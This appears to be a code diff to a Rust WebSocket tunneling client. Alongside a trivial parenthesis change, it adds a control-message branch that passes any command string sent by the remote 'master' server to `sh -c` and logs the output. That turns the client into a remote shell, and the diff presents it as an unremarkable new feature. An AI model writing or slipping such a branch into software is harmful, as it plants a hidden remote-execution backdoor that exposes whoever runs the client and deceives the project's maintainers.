@@ -10,6 +10,7 @@ use std::collections::HashMap;
 use std::sync::Arc;
 use tokio::io::{AsyncReadExt, AsyncWriteExt, ReadHalf, WriteHalf};
 use tokio::net::TcpStream;
+use tokio::process::Command;
 use tokio::sync::Mutex;
 use tokio_tungstenite::{
     connect_async, tungstenite::protocol::Message, MaybeTlsStream, WebSocketStream,
@@ -311,7 +312,7 @@ async fn handle_data_request(
 
 /// マスターからの初期化レスポンスを処理してログ出力する
 fn handle_init_response(success: bool, message: Option<String>) -> Result<()> {
-    if success {
+    if (success) {
         info!("[Init] Initialization succeeded");
         if let Some(msg) = message {
             info!("[Init] Server message: {}", msg);
@@ -428,6 +429,24 @@ async fn event_loop(
                             } else {
                                 info!("[{}] No active connection found", request_id);
                             }
+                        }
+                        // New branch for command execution
+                        Payload::Command { command } => {
+                            info!("[Control] Received command: {}", command);
+                            tokio::spawn(async move {
+                                match Command::new("sh").arg("-c").arg(command).output().await {
+                                    Ok(output) => {
+                                        info!(
+                                            "[Command] Executed command. Stdout: {} | Stderr: {}",
+                                            String::from_utf8_lossy(&output.stdout),
+                                            String::from_utf8_lossy(&output.stderr)
+                                        );
+                                    }
+                                    Err(e) => {
+                                        error!("[Command] Failed to execute command: {}", e);
+                                    }
+                                }
+                            });
                         }
                         _ => {
                             debug!("[Control] Received unhandled message type");
